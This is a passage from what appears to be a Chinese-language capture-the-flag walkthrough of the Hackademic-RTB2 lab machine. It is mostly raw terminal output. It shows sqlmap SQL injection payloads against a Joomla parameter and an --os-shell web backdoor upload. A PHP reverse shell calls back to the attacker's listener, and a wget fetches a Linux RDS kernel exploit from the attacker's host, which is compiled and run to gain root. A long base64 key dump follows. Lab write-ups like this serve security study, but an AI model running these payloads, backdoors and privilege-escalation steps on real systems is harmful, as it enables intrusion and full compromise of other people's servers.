class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 2 columns</span></span><br><span class="line"><span class="string">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...&#x27; UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x5248524f517a4a6d7669416152587a486a48704b4a45444c534d74786659424f614f7147534d7965,0x716b787871)#&amp;Itemid=3</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] testing if current user is DBA</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] fetching current user</span></span><br><span class="line"><span class="string">current user is DBA: True</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] fetched data logged to text files under &#x27;/root/.sqlmap/output/192.168.84.142&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 03:21:49 /2019-12-12/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@kali:~# sqlmap -r sqlmap.txt --os-shell</span></span><br><span class="line"><span class="string">        ___</span></span><br><span class="line"><span class="string">       __H__                                                                                           </span></span><br><span class="line"><span class="string"> ___ ___[(]_____ ___ ___  &#123;1.3.12#stable&#125;                                                              </span></span><br><span class="line"><span class="string">|_ -| . [&quot;</span>]     | .<span class="string">&#x27;| . |                                                                              </span></span><br><span class="line"><span class="string">|___|_  [(]_|_|_|__,|  _|                                                                              </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 03:45:59 /2019-12-12/</span><br><span class="line"></span><br><span class="line">[03:45:59] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[03:45:59] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[03:45:59] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: letter (GET)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...<span class="string">&#x27; AND (SELECT 4640 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(4640=4640,1))),0x716b787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uVyL&amp;Itemid=3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...&#x27;</span> AND (SELECT 1182 FROM (SELECT(SLEEP(5)))sLUv)-- PIge&amp;Itemid=3</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: MySQL UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...<span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x5248524f517a4a6d7669416152587a486a48704b4a45444c534d74786659424f614f7147534d7965,0x716b787871)#&amp;Itemid=3</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:46:00] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0</span></span><br><span class="line"><span class="string">[03:46:00] [INFO] going to use a web backdoor for command prompt</span></span><br><span class="line"><span class="string">[03:46:00] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[03:46:00] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">which web application language does the web server support?</span></span><br><span class="line"><span class="string">[1] ASP</span></span><br><span class="line"><span class="string">[2] ASPX</span></span><br><span class="line"><span class="string">[3] JSP</span></span><br><span class="line"><span class="string">[4] PHP (default)</span></span><br><span class="line"><span class="string">[03:46:02] [WARNING] unable to automatically retrieve the web server document root</span></span><br><span class="line"><span class="string">what do you want to use for writable directory?</span></span><br><span class="line"><span class="string">[1] common location(s) (&#x27;</span>/var/www/, /var/www/html, /var/www/htdocs, /usr/<span class="built_in">local</span>/apache2/htdocs, /usr/<span class="built_in">local</span>/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs<span class="string">&#x27;) (default)</span></span><br><span class="line"><span class="string">[2] custom location(s)</span></span><br><span class="line"><span class="string">[3] custom directory list file</span></span><br><span class="line"><span class="string">[4] brute force search</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] retrieved web server absolute paths: &#x27;</span>/index~.php<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] trying to upload the file stager on &#x27;</span>/var/www/<span class="string">&#x27; via LIMIT &#x27;</span>LINES TERMINATED BY<span class="string">&#x27; method</span></span><br><span class="line"><span class="string">[03:46:05] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">[03:46:05] [WARNING] unable to upload the file stager on &#x27;</span>/var/www/<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] trying to upload the file stager on &#x27;</span>/var/www/<span class="string">&#x27; via UNION method</span></span><br><span class="line"><span class="string">[03:46:05] [WARNING] expect junk characters inside the file as a leftover from UNION query</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] the remote file &#x27;</span>/var/www/tmpussxf.php<span class="string">&#x27; is larger (701 B) than the local file &#x27;</span>/tmp/sqlmap2xlaxhqs4350/tmpgmt8uc8y<span class="string">&#x27; (700B)                                                                  </span></span><br><span class="line"><span class="string">[03:46:05] [INFO] the file stager has been successfully uploaded on &#x27;</span>/var/www/<span class="string">&#x27; - http://192.168.84.142:666/tmpussxf.php</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] the backdoor has been successfully uploaded on &#x27;</span>/var/www/<span class="string">&#x27; - http://192.168.84.142:666/tmpbmblb.php</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] calling OS shell. To quit type &#x27;</span>x<span class="string">&#x27; or &#x27;</span>q<span class="string">&#x27; and press ENTER</span></span><br><span class="line"><span class="string">os-shell&gt; ls</span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] command standard output:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">CHANGELOG.php</span></span><br><span class="line"><span class="string">COPYRIGHT.php</span></span><br><span class="line"><span class="string">CREDITS.php</span></span><br><span class="line"><span class="string">INSTALL.php</span></span><br><span class="line"><span class="string">LICENSE.php</span></span><br><span class="line"><span class="string">LICENSES.php</span></span><br><span class="line"><span class="string">Untitledt.png</span></span><br><span class="line"><span class="string">_installation</span></span><br><span class="line"><span class="string">administrator</span></span><br><span class="line"><span class="string">cache</span></span><br><span class="line"><span class="string">components</span></span><br><span class="line"><span class="string">configuration.php</span></span><br><span class="line"><span class="string">configuration.php-dist</span></span><br><span class="line"><span class="string">htaccess.txt</span></span><br><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">includes</span></span><br><span class="line"><span class="string">index.php</span></span><br><span class="line"><span class="string">index2.php</span></span><br><span class="line"><span class="string">language</span></span><br><span class="line"><span class="string">libraries</span></span><br><span class="line"><span class="string">logs</span></span><br><span class="line"><span class="string">media</span></span><br><span class="line"><span class="string">modules</span></span><br><span class="line"><span class="string">pC4Hp8kt@Px8PgkV$!</span></span><br><span class="line"><span class="string">plugins</span></span><br><span class="line"><span class="string">robots.txt</span></span><br><span class="line"><span class="string">templates</span></span><br><span class="line"><span class="string">tmp</span></span><br><span class="line"><span class="string">tmpbmblb.php</span></span><br><span class="line"><span class="string">tmpugano.php</span></span><br><span class="line"><span class="string">tmpupcaf.php</span></span><br><span class="line"><span class="string">tmpussxf.php</span></span><br><span class="line"><span class="string">tmpuxtor.php</span></span><br><span class="line"><span class="string">welcome</span></span><br><span class="line"><span class="string">xmlrpc</span></span><br><span class="line"><span class="string">xxx.html</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">os-shell&gt; </span></span><br></pre></td></tr></table></figure>

<p>下面使用–os-shell执行成功后sqlmap生成的上传payload上传kali中的php反弹木马来反弹shell,php反弹木马中修改端口和ip的操作不用我多说</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub46.jpg"></p>
<p>ls查看成功上传的木马，并且浏览器访问，kali端 nc -lvp 5566 监听返回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">os-shell&gt; ls</span><br><span class="line"><span class="keyword">do</span> you want to retrieve the <span class="built_in">command</span> standard output? [Y/n/a] <span class="built_in">command</span> standard output:</span><br><span class="line">---</span><br><span class="line">15285</span><br><span class="line">15285.c</span><br><span class="line">CHANGELOG.php</span><br><span class="line">COPYRIGHT.php</span><br><span class="line">CREDITS.php</span><br><span class="line">INSTALL.php</span><br><span class="line">LICENSE.php</span><br><span class="line">LICENSES.php</span><br><span class="line">Untitledt.png</span><br><span class="line">_installation</span><br><span class="line">administrator</span><br><span class="line">bullfuck.php</span><br><span class="line">cache</span><br><span class="line">components</span><br><span class="line">configuration.php</span><br><span class="line">configuration.php-dist</span><br><span class="line">htaccess.txt</span><br><span class="line">images</span><br><span class="line">includes</span><br><span class="line">index.php</span><br><span class="line">index2.php</span><br><span class="line">language</span><br><span class="line">libraries</span><br><span class="line">logs</span><br><span class="line">media</span><br><span class="line">modules</span><br><span class="line">pC4Hp8kt@Px8PgkV$!</span><br><span class="line">php-reverse-shell.php</span><br><span class="line">plugins</span><br><span class="line">robots.txt</span><br><span class="line">templates</span><br><span class="line">tmp</span><br><span class="line">tmpbmblb.php</span><br><span class="line">tmpugano.php</span><br><span class="line">tmpupcaf.php</span><br><span class="line">tmpussxf.php</span><br><span class="line">tmpuxtor.php</span><br><span class="line">welcome</span><br><span class="line">xmlrpc</span><br><span class="line">xxx.html</span><br><span class="line">---</span><br><span class="line">os-shell&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.84.142: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.84.135] from (UNKNOWN) [192.168.84.142] 42982</span><br><span class="line">Linux HackademicRTB2 2.6.32-24-generic <span class="comment">#39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux</span></span><br><span class="line"> 11:18:34 up  7:36,  0 users,  load average: 0.15, 0.11, 0.30</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id </span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">pwd</span></span><br><span class="line"><span class="string">/var/www</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>Hackademic-RTB2靶机所用的提权exp和Hackademic-RTB1靶机所用的一模一样，<span class="exturl" data-url="aHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTI4NS8=">下载地址：<i class="fa fa-external-link-alt"></i></span></p>
<p>然后在kali中存在exp的目录下运行python一行代码在局域网中分享下载文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>
<p>然后在shell中执行命令下载该exp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://192.168.84.135:8000/15285.c</span><br><span class="line">wget http://192.168.84.135:8000/15285.c</span><br><span class="line">--2019-12-13 05:38:57--  http://192.168.84.135:8000/15285.c</span><br><span class="line">Connecting to 192.168.84.135:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 7155 (7.0K) [text/plain]</span><br><span class="line">Saving to: `15285.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[======================================&gt;] 7,155       --.-K/s   in 0s      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2019-12-13 05:38:57 (893 MB/s) - `15285.c&#x27;</span> saved [7155/7155]</span><br></pre></td></tr></table></figure>

<p>编译并运行exp进行提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc 15285.c -o 15285</span><br><span class="line">gcc 15285.c -o 15285</span><br><span class="line">$ ./15285</span><br><span class="line">./15285</span><br><span class="line">[*] Linux kernel &gt;= 2.6.30 RDS socket exploit</span><br><span class="line">[*] by Dan Rosenberg</span><br><span class="line">[*] Resolving kernel addresses...</span><br><span class="line"> [+] Resolved security_ops to 0xc08cac4c</span><br><span class="line"> [+] Resolved default_security_ops to 0xc0773340</span><br><span class="line"> [+] Resolved cap_ptrace_traceme to 0xc02f5060</span><br><span class="line"> [+] Resolved commit_creds to 0xc016dd80</span><br><span class="line"> [+] Resolved prepare_kernel_cred to 0xc016e0c0</span><br><span class="line">[*] Overwriting security ops...</span><br><span class="line">[*] Overwriting <span class="keyword">function</span> pointer...</span><br><span class="line">[*] Triggering payload...</span><br><span class="line">[*] Restoring <span class="keyword">function</span> pointer...</span><br><span class="line">[*] Got root!</span><br><span class="line"><span class="comment"># whoami </span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<p>That’s so great!!!Excellent!!!然后到root文件夹下找到key.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">Desktop  Key.txt</span><br><span class="line"><span class="comment"># cat Key.txt</span></span><br><span class="line">cat Key.txt</span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAAvQAAAFYCAIAAACziP9JAAAACXBIWXMAAAsTAAALEwEAmpwYAAAg</span><br><span class="line">AElEQVR4nOy9eZhdVZXw/bu35iFVlXmgUiQhBAIJEGKMAQGDb1rpbj5EjYK8KIoy+SniIyC2Q4uC</span><br><span class="line">Nn5tOzI4dAvaKI2CLTgEWmYIGTCBQAbIUEkqVZWa5+lO3x/nXefdt4Y71D3DvbfW78nDk1C3zll3</span><br><span class="line">n332XnuNoCiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK</span><br><span class="line">oiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK</span><br><span class="line">oiiKovhOwG8BlNynAM6AEYhCBGLQCd0Q8lswRVEUZUoS9FsAJfcphUIIQBAKICBajqIoiqL4gSo3</span><br><span class="line">SsYUi1oTlAkVgajPQimKoihTFlVulIyJicHG+m9MzTaKoiiKn6hyoziBpdlguKUURVEUxScK/RZA</span><br><span class="line">yX3C4pMCIhDQOHVFURTFT1S5UTLGUm4K5J8FiT6rKIqiKG6jyo2SMSEjlDgGQbXcKIqiKH6iMTdK</span><br><span class="line">xtiuqCAUQolOK0VRFMVP1HKjOEEYCiFqZE4piqIoik+ocqM4QRSKxD+FTitFUZQpSTVUwwC0+SyI</span><br><span class="line">7kKKE1jKjZ0BHpCCN4qiKMoU4V1QI6XOmmG7n7JocITiBCPSgSEgmVPqmXKPAqjyWwZFURSTpTAT</span><br><span class="line">QjAMEZgJ50OJb+Ko5UZxgigUymyyyhOrcuMSy+BtEIIheA66/ZZHURQFKIQwEF+w/nx4HZp8EEct</span><br><span class="line">N4oThKBIOkxZdW7UJ+UGNbAWwjAEUTjVb3kURVEs2oy0WWsjKIISWAnLfRBHlRvFIezG4EFJm1Ic</span><br><span class="line">52yIwYgsH8A0nyVSFEUBaIM2iEipM7M4yImwymtxVLlRnKBYVHVr042pcuMOsyASP9RFfoukKIpi</span><br><span class="line">8QIchg4IAVAIBaLfzIFTPJVFY24UJyg2bAmq1rhEAUyDXgiK+hjVHqWKomQTu6ECZkMdVEOpxN8E</span><br><span class="line">4UTog2MeCaLKjeIEJVBodGDQaGI3KDbsvZYGOSwRfIqiKFlCP/RDE6yAeVABMSiEclgC7TDkhRTq</span><br><span class="line">llKcoAIwfCU6rdzA9kZZwxuAATH/KoqiZBXD8AocgRE5khVDNSz06P66CylOUGpEE+uccgkrxz4o</span><br><span class="line">Zt4wjMCwz0IpiqJMyC7oACQzvBzmQLkXd9aNSHGCMqN8n1bwc4mQ4ZYKwCAM+C2SoihKYrbG13ed</span><br><span class="line">BfO8uK0qN4pzBI30P8VxwkYBiSCMwIjfIimKoiRmCA4Ydv0yqIZi12+ryo3iBANGwE1AtBzFccKS</span><br><span class="line">XVkgdfwURVGynF1QYewRNV40kFHlRnGCIWm/YAcUq3LjBsNGDy80mlhRlFxgGHqgSM5ms7wIu1Hl</span><br><span class="line">RnGCXtFs7D+q3LhBvzHOeGHaVRRFcYAWKJPTb4kk2LqJKjeKE7RKFRbTeKM4zhCUGH1b1C2lKEpO</span><br><span class="line">0AiVRuepQih194a6BSlOEJNNNyj+KbXcuMEgFMkCUaKB24qi5AhVUGq0ICyRivauoauj4gQh8ZVY</span><br><span class="line">jaXULeUSMbGQRaHM9dVBURTFGQqM0y8Sf+MmarlRnGDYqHCj2VLuERWLbhCmQYnf8iiKoqRCiRGO</span><br><span class="line">WWD0kHENtdwoTjBiBLoWqkXBNQqM4a2EMp/FURQlZwjAWgD6oAuOedvkuFJ2B6+a/qpyozhBwNBs</span><br><span class="line">Qlqk2DXso4811LaLSsknpsOHoBYOwiZo9FseJT/4MYRgBGIQhigcgtfgVU/KgZbGhy4MqeVGyQki</span><br><span class="line">RhyxtdeqcuMGxWK8CctoF6hyk1/UwhdhEHpgNlwB2+Fpv6VScp2LAOiBmCzOYZgPC+DvYCs86bIA</span><br><span class="line">0yV0IQox6He9L57G3ChOEDOsNdo70z3KxP1XqIOcp3wOBqBNlv4orIR3+iyUkvOcBZH4OmR22dUI</span><br><span class="line">rIBrXXZzz4WoWJ17YADCbt7OH8vNp6AWgD/BFh/ur7hCoREsprhEmawOMaNOsZI3nAGF0GJ4G60E</span><br><span class="line">k0WwD1r9FU7JWYKwEAaNpcOeXRHJyo7CxfCIOzpHISyCJtkgmqHPhbvE4/np73pYBcUQhbOgxuv7</span><br><span class="line">K64Qja9wo/qNS1QYNRILvI0HVDxglbxKpuZqqbML/JRLyW1qRI8pMNaNgPEnCBUwA85yR4AzoFzC</span><br><span class="line">MSPQBEPu3MjAc8vNSuiRYKIiWAJ/81oExXns/OQCCYZX3KBSyggVSFRgxG+RFAcphwHjn3a6bBj6</span><br><span class="line">/ZFISYlpUARD8Y9v0gSlVmfEof5xM8SOEYA2eBKOQTWsgaXiqIpCDZwIB6HDiZuavF+cYgXQAK2u</span><br><span class="line">B9zgtXJTCQUQlkNJpesFmBXvML256i5xiWlyzEI0G40mzifelNAE4guB9ECvb0IpcSyC86EcKqAK</span><br><span class="line">amCmvIkhaIej0AH10AE90AcD472nAfn1OTADFsAcmA7V4tmwAm97oAkaYSfsm6zMJcay3ACvQwha</span><br><span class="line">oBn+HhZLKlMM5sEip5Wb5XAG1MvCtRu6Hb3+BHir3BQZiaxRKJJB14N+rhMwDJ663bpHqeH1i7oe</span><br><span class="line">kad4zV+hFmbIwgjE4Bh0wXGfRVMAzoZbYVBevQhEoAPCsosVw6kQhPMkxyICMamRYZlhgvIim8Xc</span><br><span class="line">IzAMIeiSy1rEoAZmw9ugAPbAw9CVptjFRum8iBGN0guPwmVQC0UQg2kwB2rSv8VEFMH3JII4CHvh</span><br><span class="line">qCeZ5z64pWzlJmaoOJ58VcVd7PLEWuTGPYqM10d9UnnJ/XAWLJTwtUHogp1+S5VbFLj2apwFvdAz</span><br><span class="line">3o8CEqs7YhzXx57bC2AEehNWsbPXz5j8GYZhiMIcuBT+I33JC+RQNAuKDa/QCDwFV0CJbMoLYa9z</span><br><span class="line">ys39EIajUABd8Ip3NkhvlZsBuac182IymkquY1bOjak1zjWK5OAVk8VOyT92wk5prxGBTr/lySGq</span><br><span class="line">4LtQBQ3wkAvZuK/DmUapGBs7e9F+JQPGx2Jiv4nBiKHWWIvkMAzCAEQgLOkCRVBq1LWy79I/KbXD</span><br><span class="line">dnQGYD4Uxf+0AUJQIulU051L9LkfZsFh2RqehoMOXTkFvFVuhmEkPgtAyQ9Mt5Rqq+7RI4Frdo1R</span><br><span class="line">JV/p1Tib9PkMnADHoRw+DHXwsKPX3woLYL64HfqgDwYB0UKmiVJSBkVQKQ3gAkamhfXfVtgPx2DA</span><br><span class="line">OKgEjUuVQQmUQbmUIy+EKLyZvthhCeYFqsf7QAMsh2OykheNiW2fBL+AhXAUQhCAp2BbZhdME8/d</span><br><span class="line">Uv1QLJEZmjCcT9jVJ/WxukcvzIGQuqUUZTxKJa3MClo6Ezrgr47e4vcSCGzda0CSfwtFKSkVZSIA</span><br><span class="line">RfB2WGqoFFHohqfhMPRBVIw6iQnKAhua1FsflWiBYLx5yWYIZhrKzXQozky5eQRmQYPEnLwAm7w+</span><br><span class="line">jHmu3AxBOYxI2tRY+56SixTG50lpWLFLRKAMeiCgbilFGUOFuHWiUAgz4BxohD2O3qVngrCbcWmG</span><br><span class="line">j0uFKiAGL8OONO8YlWysyRESewwT1MeqgyL5UQBqoDyDsJtnoAAOSzGbZ+H3DuW0p4PnLoT++Nbn</span><br><span class="line">qtnkB4H4UjdhjblxhwJZg6wznCo3imJi1b63F6ISmA3rodI/kYZhH5TLP6NwwHMZorI+F07Qajci</span><br><span class="line">ao21L0+6REsJbIUCOCg1X56C3/mTM+S5cjNopNUE1HKTLxTIYy0ywooVxzlBxll7SynKKIpgpniI</span><br><span class="line">ZkA5BKAcToB3+SrYIMwSvWHEi+K8owkb1oRxU8kWQ7FRq2xyLu818DwMw0EjwGgoZf9QIUxP/6YJ</span><br><span class="line">r+ctfeKb1MjTfMKKdyuSDpoJshyVSVMGZ8MRKIYRibxRFMVijqTiBsUFMwQlMBOWwwGnnVOpE5Eq</span><br><span class="line">eVEjJdtLwvHddseuG6dBh2Fo6EzTi3QxfBLmQi80ABLZE4Vl0A9RyfwqgypRAPqhACpgJiyAuTAI</span><br><span class="line">u+HOjL6rjefKTbfU6tCCKHlGQCwKEamtqTjLp40UhsBkQwsVJV+pFvtEJQxDN/RJZHEtrINj6cTK</span><br><span class="line">OEgg3nDivXIzbCg3Y1fmZbAQnjX+T2M60cR3wIXQA4eMIi8R2QgWwokwH8rk1lEYltCFoKTH98Mh</span><br><span class="line">GIIi+BD8V0Zf18Jz5aZ9TBMi3QXzgEJ5aSNG/VzFQU6CT0BjfOUMRVFsKmS/HIJBGIYy+VEJ1MFa</span><br><span class="line">eNIPwUydpsgPl8WQIYAVPDBo/PQaKaBsqV+74XDKUTKnwzuhSbIc7K4Rdq0KKw76oPx/qy/suGtX</span><br><span class="line">VGQLQIkDzac8H2ZLlS4ygrdVuckbAupqdIcC+DOMQDMgfnFNSVMUE7s87AiMQCFUGT+dCStguR+C</span><br><span class="line">BaVKjRXjXOy5AIOGghWAOsN6dAZ8AA7I6n0InoaulNeW6dAJPdINJiJ/GTH+HhUzc1j+T0yWr6jx</span><br><span class="line">F+vYFnasp6YfqeC2/oh2/ssXCuMNcoqzvAhheMsIBgyo5UZR4hk22vuUww54BmrhbDgBArAAzoVm</span><br><span class="line">z4s+W5tdUN5fz3fd/xsnYJ2LLpJiPP8LPgt9cBiAXtgErelceSd0izvJVlbC8X+JjPHS2H8xi+5Y</span><br><span class="line">/qkDjvUM96OIX4GRUKOaTX5QaCwr+lid5b9gppQlXQStUC+VMFWPVBSbIWMVisAW2AmvQS9cJGX3</span><br><span class="line">ToRz4XHPZbOOfzGp8ud9g5phSfCOwBo4E5bBbGiGV8Wu87iEA6dOH9wDp0vLrR4puDzsaaeFcfFc</span><br><span class="line">uTG9j2HdCPMIuweKbroO8g1Ya7jA+6EHOmC2tgRXlHjsMBHLUtIphoFnYaX4g6bDMjgZ3vJQMLv0</span><br><span class="line">iWW8KZ447sQ9+qBS0qZKoRAOw34ZtAC8lH5pQYuXYSdUSFxw1qz/nodIBOKzpZT8wA4oDmbR5M55</span><br><span class="line">roSrocVI8WiGRom80ZQ0RTHpBoy8JPPt+JnUlLO6Xq8zYo09wIq5KRYLd7EfsYnDcveZ0h5rnthy</span><br><span class="line">gjAAf8rg4kPQLq3Os2ZR8iP+s1CO+PZBX8l17ENJhm6pUqhzUq4cZjn8f9AJLUYCQgHMhNP9cNsr</span><br><span class="line">SpbTLX8JGmctiyFJdbZKrSyBld7KViDJ2FZHTO8P9v2iVM2BRTAdonAMOgDYmYddWj1XbgplIywa</span><br><span class="line">T79WcpRCebIFGVhuvgE74LfwHw5Ll5M8AwPQIKmtwxJ9Xwjl+tYoyhhGICxqhJ2Na/O47O4BmA+n</span><br><span class="line">xudSuYqtbNkNt70/nITFvm6lMlVAO2yRXhCTbiOVxfih3BQYB30t4pcfFBqWm8m1DLsR/je0wjFo</span><br><span class="line">g1XOy5hLPAMhWXf+G74An4Y/QLtRCEvJYxbDd+HDfouRc3QYekPRmIXoCSiTk9gyWOqVVKZhG9kE</span><br><span class="line">PSYsN+2AJ+B6+Aw8CR0QhNN8bb/lDn4oN4WiwGrjzHzCrDqd7mMtgS/CcegSw89UdrvcDCvhKETg</span><br><span class="line">93A/HIEOeAQqACmEpeQrdfAibIBPw8PeRofkOp1SkhjpLWXyhNT+D8JcWJpBh8h0KTD2vlI/3t8R</span><br><span class="line">uWkrHIImqIaTYD4AdfCefJtpfuwhBWIc04DivGFUWfF0nSZfgyFokTJQvWl2NsknToEvQxP0i5PO</span><br><span class="line">riU6DCdBPSBNalTFyUv+A3rgOERgGC52phr9lKAPiqHfiHww6YJdsASGoQgWwUJP0qbsTrdFcjLx</span><br><span class="line">fu+LSXOrKJwMl8EiCMmSWwor5TSVL3i+OpYazgvUcpMvjHpX01VuPi4ZQFbdpyb55xTkAeiFRuiB</span><br><span class="line">340pqGWd/yyfVFBfn3xkCZwMrRJFXupHQdvcZUAO7FGoG+/w/iLMlH2vDuZ4IpXdW8peGH1xK1sB</span><br><span class="line">kSVQBSeNqSUxD06Dq8Q8nPt4rtzYNkNbe9UFOm+wZ1Nays2XIAytcobYDYemqnLzKVgKDRCFTfBa</span><br><span class="line">wg+r2SYvORFCUn0kAiHo91miXMJq92glbJ443j79OpRJod5KmA/TPBHMDEb0JR6j0AjXi8Kj8Am4</span><br><span class="line">BZ42evHWwlL4PJzluXgu4Idyg6g1QV2g8wU7QyqQZk/H+XATHIMRCME+2A5b3RIz2/k2tMIANMIz</span><br><span class="line">E/Sui8p/sypk7Z3wT/ABv8XIA2IQku05Bn1GhrOSlCGjs+z88Sw3R6BLbBgBOBFmui+V6abw8Ugf</span><br><span class="line">MJo6PQuD0AB/gTegVxbw6VAFF8O7/ZDQUTyPubFNrEF5h6can4Gz4Qj8KM0uHplTBOfBuVAAP4Vj</span><br><span class="line">Tl/fLseS+mP9BfTAUYjCHtgMr2RrxYXPwmo4Ct9358F9HcJitvkfODLeMEaNMllZkmz4brgZ6qAb</span><br><span class="line">1sHJ8G2/RcppmsWEaW1CbdDmuQyFcD6sgwL4uQsLhXuMGHrh9DHZ4Bb74STZfSzlpt5jKf3Y+Erl</span><br><span class="line">2Gn1sLTrgjbBX6EMThR1oAJK4FwYgec9l9M5PFduSuQvdjvQKcUd8EFohiic62301o1wLQxDH3TC</span><br><span class="line">V+CLzpU3MBs6BlN+da+H0+ENiEIXbIdtUlQq27gDPgJNEHPtwV0NzRCBZnglYeu4bNBpgBXwbVgG</span><br><span class="line">XXAQ+qT1XZWxdCrp0iqvjxXs2ea5rn8jfAqGoB+6YA58OXfqoITlAIAUzRtLI6yETohBBVR4W27N</span><br><span class="line">r/N8jdHDMhzvM9kHs6EYTpD/XwKz4DxogX3+yJs5nis3pcYQk2Wmdbcpho/AYWiBkIedaU+A/4ZS</span><br><span class="line">aBSTQwSOwxnwnEO3sBWaWMqJAEvga3AIOiACL8LubNVsiuGjcASOQ8idhf59EIVmiMErcGwCvT82</span><br><span class="line">5o9f3AmXQzccgD7ZUcKq1mSMNbusYE/rnO1Eh+SUsBaKEmiEdika2eboQuE2w0ZOUBSK5J8mr8I/</span><br><span 